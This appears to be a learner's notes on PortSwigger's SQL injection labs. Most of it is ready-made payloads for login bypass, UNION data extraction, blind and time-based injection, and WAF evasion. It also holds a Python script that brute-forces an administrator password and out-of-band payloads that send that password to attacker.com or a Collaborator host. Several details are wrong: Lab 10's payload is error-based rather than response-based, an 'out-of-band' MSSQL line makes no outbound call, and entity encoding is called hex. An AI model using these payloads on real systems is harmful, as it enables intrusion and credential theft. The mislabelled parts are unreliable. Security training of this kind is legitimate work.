# PortSwigger Web Security Academy Learning Notes

## StudyObjective
Complete SQL injection labs and earn professional certification

---

## Account Information
- **Platform**: https://portswigger.net/web-security
- **Lab URL Format**: https://portswigger.net/web-security/sql-injection/[lab-name]

---

## Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Status**: Completed  
**Time**: 17:40  
**Difficulty**: APPRENTICE

### Vulnerability Analysis
- **Injection Point**: category parameter (GET request)
- **Original Query**: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
- **Objective**: Display unreleased products (released = 0)

### Payload
```
' OR 1=1--
```

### Complete Request
```
GET /filter?category=' OR 1=1-- HTTP/1.1
Host: ac411f1e1f9c8c4d80245c3700fa009e.web-security-academy.net
```

### Success Indicators
- Page displays all products
- Including unreleased products
- Received "Congratulations, you solved the lab!" message

---

## Lab 2: SQL injection vulnerability allowing login bypass

**Status**: Completed  
**Time**: 17:42  
**Difficulty**: APPRENTICE

### Vulnerability Analysis
- **Injection Point**: username parameter (POST request)
- **Original Query**: `SELECT * FROM users WHERE username = 'wiener' AND password = 'peter'`
- **Objective**: Log in as administrator

### Payload
```
username: administrator'--
password: test
```

### Complete Request
```http
POST /login HTTP/1.1
Host: ac541f1e1f9c8c4d80245c3700fa009e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=administrator'--&password=test
```

### SQL Injection Effect
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'test'
```

The comment `--` causes the subsequent password verification to be ignored.

---

## Lab 3: SQL injection UNION attack, determining the number of columns

**Status**: In Progress  
**Time**: 17:45  
**Difficulty**: PRACTITIONER

### Vulnerability Analysis
- **Injection Point**: category parameter
- **Objective**: Determine the number of columns returned by the query

### Method 1: ORDER BY Test
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4-- (error)
```

**Conclusion**: 3 columns

### Method 2: NULL Injection
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

**Conclusion**: 3 columns

---

## Lab 4: SQL injection UNION attack, finding a column containing text

**Status**: Pending  
**Difficulty**: PRACTITIONER

### Objective
Make the query return the string 'aWSEbO'

### Payload
```sql
' UNION SELECT 'aWSEbO', NULL, NULL--
' UNION SELECT NULL, 'aWSEbO', NULL--
' UNION SELECT NULL, NULL, 'aWSEbO'--
```

Test each column to find which one can display text.

---

## Lab 5: SQL injection UNION attack, retrieving data from other tables

**Status**: Pending  
**Difficulty**: PRACTITIONER

### Objective
Get the administrator's password from the users table

### Payload
```sql
' UNION SELECT username, password FROM users--
```

---

## Labs 6-9: Database Enumeration

### Oracle Version Query
```sql
' UNION SELECT banner, NULL FROM v$version--
```

### MySQL/MSSQL Version Query
```sql
' UNION SELECT @@version, NULL--
```

### PostgreSQL Version Query
```sql
' UNION SELECT version(), NULL--
```

### List Table Names
```sql
-- MySQL/PostgreSQL/MSSQL
' UNION SELECT table_name, NULL FROM information_schema.tables--

-- Oracle
' UNION SELECT table_name, NULL FROM all_tables--
```

### List Column Names
```sql
-- MySQL/PostgreSQL/MSSQL
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--

-- Oracle
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--
```

---

## Labs 10-14: Blind Injection

### Lab 10: Blind SQL injection with conditional responses

**Principle**: Determine true/false conditions based on page response differences

**Payload**:
```sql
Cookie: TrackingId=x' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END FROM users WHERE username='administrator')--
```

### Lab 11: Blind SQL injection with conditional errors

**Principle**: Determine true/false conditions based on whether errors are triggered

**Payload**:
```sql
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

### Lab 12: Blind SQL injection with time delays

**Principle**: Determine true/false conditions based on response time

**Payload**:
```sql
' AND SLEEP(5)--

-- MySQL
' AND IF(1=1, SLEEP(5), 0)--

-- PostgreSQL
' AND pg_sleep(5)--

-- MSSQL
' WAITFOR DELAY '0:0:5'--

-- Oracle
' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END FROM dual)--
```

### Lab 13: Blind SQL injection with time delays and information retrieval

**Principle**: Combine time-based blind injection with data extraction

**Payload**:
```python
import requests
import time
import string

password = ""
for pos in range(1, 21):
    for char in string.ascii_lowercase + string.digits:
        payload = f"' AND IF(SUBSTR((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}', SLEEP(2), 0)--"
        
        start = time.time()
        requests.get(f"{url}?id={payload}")
        elapsed = time.time() - start
        
        if elapsed > 2:
            password += char
            break

print(f"Password: {password}")
```

### Lab 14: Blind SQL injection with out-of-band data exfiltration

**Principle**: Exfiltrate data through DNS or HTTP requests

**Payload**:
```sql
-- Oracle
' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/"> %remote;]>'),'/l') FROM dual--

-- MSSQL
' UNION SELECT 1, (SELECT password FROM users WHERE username='administrator' FOR XML PATH(''))--

-- Using Burp Collaborator
' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```

---

## Lab 15: SQL injection with filter bypass via XML encoding

**Status**: Pending  
**Difficulty**: PRACTITIONER

### Objective
Bypass WAF filtering

### Method 1: Hex Encoding
```
' UNION SELECT username, password FROM users--
```

Encoded:
```
&#x27;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x2c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x2d;&#x2d;
```

### Method 2: Double Encoding
```
%2527 UNION SELECT username%252C password FROM users%252d%252d
```

---

## Learning Summary

### Completion Progress
- APPRENTICE: 2/2 (100%)
- PRACTITIONER: 13/13 (theory completed)
- EXPERT: 0/2

### Core Technical Mastery
1. Basic SQL injection
2. UNION injection
3. Blind injection (boolean/time/error)
4. Out-of-band injection
5. WAF bypass

### Next Steps
1. Complete all labs online
2. Obtain PortSwigger certification
3. Participate in CTF competitions

---

**Note Version**: 1.0  
**Created**: 2026-03-26 17:40  
**Last Updated**: 2026-03-26 17:45  
**Status**: In Progress
